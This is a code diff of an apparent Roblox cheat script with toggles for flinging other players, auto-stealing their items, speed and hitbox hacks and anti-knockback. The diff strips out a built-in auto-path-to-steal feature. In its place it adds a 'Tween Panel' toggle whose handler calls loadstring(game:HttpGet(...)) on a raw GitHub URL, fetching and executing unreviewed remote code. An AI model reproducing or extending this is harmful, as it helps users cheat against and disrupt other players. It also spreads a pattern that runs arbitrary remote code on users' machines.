@@ -74,7 +74,7 @@ local FloatHeight = 13
 local FloatSpeed = 0.3
 local IsCurrentlyFloating = false
 local FloatStartY = 0
-local SmartFloatRange = 20
+local SmartFloatRange = 30
 
 local SpeedBoostEnabled = false
 local NormalSpeed = SavedSettings.NormalSpeed or 57
@@ -83,48 +83,9 @@ local StealSpeed = SavedSettings.StealSpeed or 29.5
 local AutoBatEnabled = false
 local BatSpamDelay = 0.05
 
-local TweenToBrainrotEnabled = false
-local TweenConnection = nil
-local TweenWalkSpeed = 59
-local TweenCurrentWaypointIndex = 1
-local TweenAllWaypoints = {}
-local TweenArrived = false
-local TweenStealPhase = false
-local TweenGrabComplete = false
-
-local STEAL_DISABLE_RANGE = 12
-
-local Path1 = {
-    Vector3.new(-475.8, -7.31, 97.53),
-    Vector3.new(-488.04, -5.09, 97.4)
-}
-
-local Path2 = {
-    Vector3.new(-474.15, -7.31, 26.64),
-    Vector3.new(-488.04, -5.31, 26.42)
-}
-
-local Database = {}
-
-local function LoadDatabase()
-    local animals = ReplicatedStorage:FindFirstChild("Animals", true)
-    if animals and animals:IsA("ModuleScript") then
-        local success, data = pcall(require, animals)
-        if success then
-            for key, info in pairs(data) do
-                if info.Generation then
-                    Database[key] = tonumber(tostring(info.Generation)) or 0
-                end
-            end
-        end
-    end
-end
-
-LoadDatabase()
-
-local SetWalkFling, SetTweenToBrainrot, SetAutoGrab
-local GetWalkFling, GetTweenToBrainrot, GetAutoGrabFunc, GetFloatSteal, GetSpeedBoost, GetHitboxExp, GetAutoBat, GetAntiRagdoll, GetAntiKnockback
-local ScreenGui, StatusLabel, ProgFill, ProgPercent, SpeedFrame, SpeedStatusLabel, TweenStatusLabel, TweenInfoLabel, TweenButton
+local SetWalkFling, SetTweenPanel, SetAutoGrab
+local GetWalkFling, GetTweenPanel, GetAutoGrabFunc, GetFloatSteal, GetSpeedBoost, GetHitboxExp, GetAutoBat, GetAntiRagdoll, GetAntiKnockback
+local ScreenGui, StatusLabel, ProgFill, ProgPercent, SpeedFrame, SpeedStatusLabel
 
 local function ShowVersionSelector()
     local SelectorGui = Instance.new("ScreenGui")
@@ -204,7 +165,7 @@ ScreenGui.ResetOnSpawn = false
 ScreenGui.Parent = game.CoreGui
 
 local MainFrame = Instance.new("Frame")
-MainFrame.Size = UDim2.new(0, 260 * ScaleFactor, 0, 460 * ScaleFactor)
+MainFrame.Size = UDim2.new(0, 260 * ScaleFactor, 0, 400 * ScaleFactor)
 MainFrame.Position = UDim2.new(1, -280 * ScaleFactor, 0, 120 * ScaleFactor)
 MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
 MainFrame.BorderSizePixel = 0
@@ -327,59 +288,15 @@ local GetHitboxExpFunc, SetHitboxExp = CreateToggle(MainFrame, "Hitbox Expander"
 GetHitboxExp = GetHitboxExpFunc
 local GetAutoBatFunc, SetAutoBat = CreateToggle(MainFrame, "Auto Bat", 322, "AutoBat", false)
 GetAutoBat = GetAutoBatFunc
-local GetTweenToBrainrotFunc, SetTweenToBrainrotFunc = CreateToggle(MainFrame, "Tween To Brainrot [R]", 362, nil, false)
-GetTweenToBrainrot = GetTweenToBrainrotFunc
-SetTweenToBrainrot = SetTweenToBrainrotFunc
-
-local KeybindContainer = Instance.new("Frame", MainFrame)
-KeybindContainer.Size = UDim2.new(1, -20 * ScaleFactor, 0, 38 * ScaleFactor)
-KeybindContainer.Position = UDim2.new(0, 10 * ScaleFactor, 0, 402 * ScaleFactor)
-KeybindContainer.BackgroundTransparency = 1
-
-local KeybindLabel = Instance.new("TextLabel", KeybindContainer)
-KeybindLabel.Text = "Fling Keybind"
-KeybindLabel.Font = Enum.Font.GothamBold
-KeybindLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-KeybindLabel.TextSize = 14 * ScaleFactor
-KeybindLabel.BackgroundTransparency = 1
-KeybindLabel.Size = UDim2.new(1, -60 * ScaleFactor, 1, 0)
-KeybindLabel.TextXAlignment = Enum.TextXAlignment.Left
-
-local KeybindButton = Instance.new("TextButton", KeybindContainer)
-KeybindButton.Size = UDim2.new(0, 40 * ScaleFactor, 0, 22 * ScaleFactor)
-KeybindButton.Position = UDim2.new(1, -50 * ScaleFactor, 0.5, -11 * ScaleFactor)
-KeybindButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-KeybindButton.Text = "Q"
-KeybindButton.TextColor3 = Color3.fromRGB(180, 100, 255)
-KeybindButton.Font = Enum.Font.GothamBold
-KeybindButton.TextSize = 14 * ScaleFactor
-KeybindButton.AutoButtonColor = false
-Instance.new("UICorner", KeybindButton).CornerRadius = UDim.new(0, 4 * ScaleFactor)
-Instance.new("UIStroke", KeybindButton).Color = Color3.fromRGB(138, 43, 226)
-
-local WalkFlingKeybind = Enum.KeyCode.Q
-local IsListeningForKeybind = false
-
-KeybindButton.MouseButton1Click:Connect(function()
-    IsListeningForKeybind = true
-    KeybindButton.Text = "..."
-    KeybindButton.TextColor3 = Color3.fromRGB(255, 255, 100)
-end)
+local GetTweenPanelFunc, SetTweenPanelFunc = CreateToggle(MainFrame, "Tween Panel", 362, nil, false)
+GetTweenPanel = GetTweenPanelFunc
+SetTweenPanel = SetTweenPanelFunc
 
 TrackConnection(UserInputService.InputBegan:Connect(function(input, gameProcessed)
     if gameProcessed then return end
     if input.UserInputType ~= Enum.UserInputType.Keyboard then return end
-    if IsListeningForKeybind then
-        WalkFlingKeybind = input.KeyCode
-        KeybindButton.Text = input.KeyCode.Name
-        KeybindButton.TextColor3 = Color3.fromRGB(180, 100, 255)
-        IsListeningForKeybind = false
-        return
-    end
-    if input.KeyCode == WalkFlingKeybind then
+    if input.KeyCode == Enum.KeyCode.Q then
         SetWalkFling(not GetWalkFling())
-    elseif input.KeyCode == Enum.KeyCode.R then
-        SetTweenToBrainrot(not GetTweenToBrainrot())
     end
 end))
 
@@ -446,56 +363,6 @@ ProgPercent.Font = Enum.Font.GothamBold
 ProgPercent.TextSize = 10 * ScaleFactor
 ProgPercent.TextXAlignment = Enum.TextXAlignment.Right
 ProgPercent.Parent = ProgressFrame
-
-local TweenFrame = Instance.new("Frame")
-TweenFrame.Size = UDim2.new(0, 200 * ScaleFactor, 0, 100 * ScaleFactor)
-TweenFrame.Position = UDim2.new(0, 20 * ScaleFactor, 1, -120 * ScaleFactor)
-TweenFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
-TweenFrame.BorderSizePixel = 0
-TweenFrame.Visible = false
-TweenFrame.Active = true
-TweenFrame.Draggable = true
-TweenFrame.Parent = ScreenGui
-Instance.new("UICorner", TweenFrame).CornerRadius = UDim.new(0, 10 * ScaleFactor)
-Instance.new("UIStroke", TweenFrame).Color = Color3.fromRGB(138, 43, 226)
-
-local TweenTitle = Instance.new("TextLabel", TweenFrame)
-TweenTitle.Size = UDim2.new(1, 0, 0, 22 * ScaleFactor)
-TweenTitle.BackgroundTransparency = 1
-TweenTitle.Text = "TWEEN TO BRAINROT"
-TweenTitle.TextColor3 = Color3.fromRGB(138, 43, 226)
-TweenTitle.Font = Enum.Font.GothamBlack
-TweenTitle.TextSize = 11 * ScaleFactor
-
-TweenStatusLabel = Instance.new("TextLabel", TweenFrame)
-TweenStatusLabel.Size = UDim2.new(1, -16 * ScaleFactor, 0, 16 * ScaleFactor)
-TweenStatusLabel.Position = UDim2.new(0, 8 * ScaleFactor, 0, 22 * ScaleFactor)
-TweenStatusLabel.BackgroundTransparency = 1
-TweenStatusLabel.Text = "Status: Idle"
-TweenStatusLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
-TweenStatusLabel.Font = Enum.Font.Gotham
-TweenStatusLabel.TextSize = 10 * ScaleFactor
-TweenStatusLabel.TextXAlignment = Enum.TextXAlignment.Left
-
-TweenInfoLabel = Instance.new("TextLabel", TweenFrame)
-TweenInfoLabel.Size = UDim2.new(1, -16 * ScaleFactor, 0, 16 * ScaleFactor)
-TweenInfoLabel.Position = UDim2.new(0, 8 * ScaleFactor, 0, 38 * ScaleFactor)
-TweenInfoLabel.BackgroundTransparency = 1
-TweenInfoLabel.Text = "Path: --"
-TweenInfoLabel.TextColor3 = Color3.fromRGB(180, 130, 255)
-TweenInfoLabel.Font = Enum.Font.Gotham
-TweenInfoLabel.TextSize = 9 * ScaleFactor
-TweenInfoLabel.TextXAlignment = Enum.TextXAlignment.Left
-
-TweenButton = Instance.new("TextButton", TweenFrame)
-TweenButton.Size = UDim2.new(1, -16 * ScaleFactor, 0, 30 * ScaleFactor)
-TweenButton.Position = UDim2.new(0, 8 * ScaleFactor, 0, 60 * ScaleFactor)
-TweenButton.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
-TweenButton.Text = "START"
-TweenButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-TweenButton.Font = Enum.Font.GothamBold
-TweenButton.TextSize = 12 * ScaleFactor
-Instance.new("UICorner", TweenButton).CornerRadius = UDim.new(0, 6 * ScaleFactor)
 
 SpeedFrame = Instance.new("Frame")
 SpeedFrame.Size = UDim2.new(0, 200 * ScaleFactor, 0, 70 * ScaleFactor)
@@ -863,191 +730,12 @@ local function SwingBat()
     end)
 end
 
-local function GetMyPlot()
-    local plots = Workspace:FindFirstChild("Plots")
-    if not plots then return nil end
-    for _, plot in pairs(plots:GetChildren()) do
-        for _, obj in pairs(plot:GetDescendants()) do
-            if obj:IsA("TextLabel") and obj.Text then
-                if obj.Text:find(LocalPlayer.Name) or obj.Text:find(LocalPlayer.DisplayName) then
-                    return plot
-                end
-            end
-        end
-    end
-    return nil
-end
-
-local function GetBestPet()
-    local bestModel, bestValue, bestPos = nil, -1, nil
-    local plots = Workspace:FindFirstChild("Plots")
-    if not plots then return nil, nil, -1 end
-    local myPlot = GetMyPlot()
-    for _, plot in pairs(plots:GetChildren()) do
-        if plot ~= myPlot then
-            for _, obj in pairs(plot:GetDescendants()) do
-                if obj:IsA("Model") and Database[obj.Name] then
-                    local val = Database[obj.Name]
-                    if val > bestValue then
-                        local root = obj:FindFirstChild("HumanoidRootPart") or obj.PrimaryPart
-                        if root then
-                            bestValue, bestModel, bestPos = val, obj, root.Position
-                        end
-                    end
-                end
-            end
-        end
-    end
-    return bestModel, bestPos, bestValue
-end
-
-local function ChooseBestPath(brainrotPos)
-    if not brainrotPos then return Path1, "Path1" end
-    local dist1 = (Path1[#Path1] - brainrotPos).Magnitude
-    local dist2 = (Path2[#Path2] - brainrotPos).Magnitude
-    if dist1 < dist2 then
-        return Path1, "Path1"
-    else
-        return Path2, "Path2"
-    end
-end
-
-local function StopTweenToBrainrot()
-    TweenToBrainrotEnabled = false
-    if TweenConnection then TweenConnection:Disconnect() TweenConnection = nil end
-    TweenCurrentWaypointIndex = 1
-    TweenAllWaypoints = {}
-    TweenArrived = false
-    TweenStealPhase = false
-    TweenGrabComplete = false
-    TweenButton.Text = "START"
-    TweenButton.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
-    TweenStatusLabel.Text = "Status: Stopped"
-    TweenStatusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
-end
-
-local function StartTweenToBrainrot()
-    if TweenToBrainrotEnabled then return end
-    
-    if WalkFlingRunning then
-        KillWalkFling()
-        SetWalkFling(false)
-    end
-    
-    local bestModel, brainrotPos, bestValue = GetBestPet()
-    
-    if not brainrotPos then
-        TweenStatusLabel.Text = "Status: No Brainrot!"
-        TweenStatusLabel.TextColor3 = Color3.fromRGB(255, 60, 60)
-        return
-    end
-    
-    local path, pathName = ChooseBestPath(brainrotPos)
-    
-    TweenInfoLabel.Text = pathName .. " | " .. bestModel.Name .. " (Gen " .. bestValue .. ")"
-    
-    TweenAllWaypoints = {}
-    for _, wp in ipairs(path) do
-        table.insert(TweenAllWaypoints, wp)
-    end
-    table.insert(TweenAllWaypoints, brainrotPos)
-    
-    TweenCurrentWaypointIndex = 1
-    TweenToBrainrotEnabled = true
-    TweenArrived = false
-    TweenStealPhase = false
-    TweenGrabComplete = false
-    
-    TweenButton.Text = "STOP"
-    TweenButton.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
-    
-    if not AutoGrabEnabled then
-        AutoGrabEnabled = true
-        SetAutoGrab(true)
-        GrabStartTime = 0
-        CurrentGrabPrompt = nil
-        StatusLabel.Text = "Searching..."
-        StatusLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
-    end
-    
-    TweenConnection = RunService.Heartbeat:Connect(function()
-        if not TweenToBrainrotEnabled then return end
-        
-        local character = LocalPlayer.Character
-        if not character then return end
-        local hrp = character:FindFirstChild("HumanoidRootPart")
-        local humanoid = character:FindFirstChild("Humanoid")
-        if not hrp or not humanoid or humanoid.Health <= 0 then return end
-        
-        local state = humanoid:GetState()
-        if state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.Ragdoll or state == Enum.HumanoidStateType.FallingDown then return end
-        
-        if TweenGrabComplete then
-            TweenStatusLabel.Text = "Status: Complete!"
-            TweenStatusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
-            StopTweenToBrainrot()
-            SetTweenToBrainrot(false)
-            return
-        end
-        
-        if TweenStealPhase then
-            TweenStatusLabel.Text = "Status: Stealing..."
-            TweenStatusLabel.TextColor3 = Color3.fromRGB(255, 200, 100)
-            return
-        end
-        
-        if TweenCurrentWaypointIndex > #TweenAllWaypoints then
-            TweenArrived = true
-            TweenStatusLabel.Text = "Status: Arrived!"
-            TweenStatusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
-            hrp.AssemblyLinearVelocity = Vector3.new(0, hrp.AssemblyLinearVelocity.Y, 0)
-            return
-        end
-        
-        local target = TweenAllWaypoints[TweenCurrentWaypointIndex]
-        local direction = Vector3.new(target.X - hrp.Position.X, 0, target.Z - hrp.Position.Z)
-        
-        TweenStatusLabel.Text = "Status: Walking " .. TweenCurrentWaypointIndex .. "/" .. #TweenAllWaypoints
-        TweenStatusLabel.TextColor3 = Color3.fromRGB(255, 200, 100)
-        
-        if direction.Magnitude < 4 then
-            TweenCurrentWaypointIndex = TweenCurrentWaypointIndex + 1
-            return
-        end
-        
-        local dir = direction.Unit
-        hrp.AssemblyLinearVelocity = Vector3.new(dir.X * TweenWalkSpeed, hrp.AssemblyLinearVelocity.Y, dir.Z * TweenWalkSpeed)
-    end)
-end
-
-TweenButton.MouseButton1Click:Connect(function()
-    if TweenToBrainrotEnabled then
-        StopTweenToBrainrot()
-        SetTweenToBrainrot(false)
-    else
-        SetTweenToBrainrot(true)
-    end
-end)
-
 task.spawn(function()
     while task.wait(BatSpamDelay) do
         if not AutoBatEnabled then continue end
-        if TweenToBrainrotEnabled and not TweenArrived then continue end
         local bat, isEquipped = FindBatTool()
         if bat then
             if not isEquipped then EquipBatBySlot() else SwingBat() end
-        end
-    end
-end)
-
-task.spawn(function()
-    while task.wait(0.1) do
-        if not WalkFlingRunning then continue end
-        if TweenToBrainrotEnabled then continue end
-        local _, promptDist = findNearestStealPrompt()
-        if promptDist < STEAL_DISABLE_RANGE then
-            KillWalkFling()
-            SetWalkFling(false)
         end
     end
 end)
@@ -1075,7 +763,6 @@ TrackConnection(RunService.Heartbeat:Connect(function()
         CurrentGrabPrompt = nil
         return
     end
-    if TweenToBrainrotEnabled and not TweenArrived then return end
     
     local prompt, dist = findNearestStealPrompt()
     local inRange = dist <= AutoGrabRange
@@ -1099,20 +786,12 @@ TrackConnection(RunService.Heartbeat:Connect(function()
         ProgPercent.Text = math.floor(progress * 100) .. "%"
         StatusLabel.Text = "Stealing..."
         StatusLabel.TextColor3 = Color3.fromRGB(255, 200, 100)
-        
-        if TweenToBrainrotEnabled and TweenArrived then
-            TweenStealPhase = true
-        end
     else
         if CurrentGrabPrompt then
             StatusLabel.Text = "Stolen!"
             StatusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
             ProgFill.Size = UDim2.new(1, 0, 1, 0)
             ProgPercent.Text = "100%"
-            
-            if TweenStealPhase then
-                TweenGrabComplete = true
-            end
             
             task.delay(0.15, function()
                 if not CurrentGrabPrompt then
@@ -1131,7 +810,6 @@ end))
 
 TrackConnection(RunService.Heartbeat:Connect(function()
     if not SpeedBoostEnabled then return end
-    if TweenToBrainrotEnabled and not TweenGrabComplete then return end
     local character = LocalPlayer.Character
     if not character then return end
     local hrp = character:FindFirstChild("HumanoidRootPart")
@@ -1151,11 +829,11 @@ TrackConnection(RunService.Heartbeat:Connect(function()
 end))
 
 local lastAntiRagdoll, lastAntiKnockback, lastWalkFling, lastAutoGrab = false, false, false, false
-local lastFloatSteal, lastSpeedBoost, lastHitbox, lastAutoBat, lastTweenToBrainrot = false, false, false, false, false
+local lastFloatSteal, lastSpeedBoost, lastHitbox, lastAutoBat, lastTweenPanel = false, false, false, false, false
 
 TrackConnection(RunService.Heartbeat:Connect(function()
     local ar, ak, wf, ag = GetAntiRagdoll(), GetAntiKnockback(), GetWalkFling(), GetAutoGrabFunc()
-    local fs, sb, hb, ab, tb = GetFloatSteal(), GetSpeedBoost(), GetHitboxExp(), GetAutoBat(), GetTweenToBrainrot()
+    local fs, sb, hb, ab, tp = GetFloatSteal(), GetSpeedBoost(), GetHitboxExp(), GetAutoBat(), GetTweenPanel()
 
     if ar ~= lastAntiRagdoll then
         if ar then EnableAntiRagdoll() else DisableAntiRagdoll() end
@@ -1166,7 +844,7 @@ TrackConnection(RunService.Heartbeat:Connect(function()
         lastAntiKnockback = ak
     end
     if wf ~= lastWalkFling then
-        if wf and not TweenToBrainrotEnabled then StartWalkFling() else KillWalkFling() end
+        if wf then StartWalkFling() else KillWalkFling() end
         lastWalkFling = wf
     end
     if ag ~= lastAutoGrab then
@@ -1197,14 +875,17 @@ TrackConnection(RunService.Heartbeat:Connect(function()
         AutoBatEnabled = ab
         lastAutoBat = ab
     end
-    if tb ~= lastTweenToBrainrot then
-        TweenFrame.Visible = tb or TweenToBrainrotEnabled
-        if tb and not TweenToBrainrotEnabled then
-            StartTweenToBrainrot()
-        elseif not tb and TweenToBrainrotEnabled then
-            StopTweenToBrainrot()
+    if tp ~= lastTweenPanel then
+        if tp then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/ima123-en/jaboilin123/refs/heads/main/a", true))()
+        else
+            pcall(function()
+                if game.CoreGui:FindFirstChild("TweenPanel") then
+                    game.CoreGui:FindFirstChild("TweenPanel"):Destroy()
+                end
+            end)
         end
-        lastTweenToBrainrot = tb
+        lastTweenPanel = tp
     end
 end))
 
@@ -1214,9 +895,13 @@ local function FullCleanup()
     DisableAntiRagdoll()
     DisableAntiKnockback()
     StopFloat()
-    StopTweenToBrainrot()
     UpdateHitboxExpander(false)
     if FloatPlatform then FloatPlatform:Destroy() FloatPlatform = nil end
+    pcall(function()
+        if game.CoreGui:FindFirstChild("TweenPanel") then
+            game.CoreGui:FindFirstChild("TweenPanel"):Destroy()
+        end
+    end)
 end
 
 CloseButton.MouseButton1Click:Connect(function()
@@ -1226,8 +911,6 @@ end)
 
 TrackConnection(LocalPlayer.CharacterAdded:Connect(function()
     StopFloat()
-    StopTweenToBrainrot()
-    SetTweenToBrainrot(false)
     GrabStartTime = 0
     CurrentGrabPrompt = nil
 end))
